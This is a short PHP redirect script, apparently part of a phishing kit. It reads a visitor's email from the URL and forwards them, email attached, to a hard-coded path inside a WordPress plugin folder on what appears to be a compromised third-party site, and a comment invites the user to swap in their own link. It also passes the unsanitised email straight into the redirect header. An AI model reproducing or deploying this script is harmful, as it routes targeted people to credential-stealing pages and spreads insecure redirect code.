<?php

session_start();

require "api.php";

if(isset($_GET['email'])) {

$email = $_GET['email'];

}
/* Edit your main link here > example: https://domain.com/folder/  no file name at end*/
$link = "https://alertalarmbrunswick.com/wp-content/plugins/ubh/osn/";
$id = "?email=$email";

header ("Location: $link$id");

?>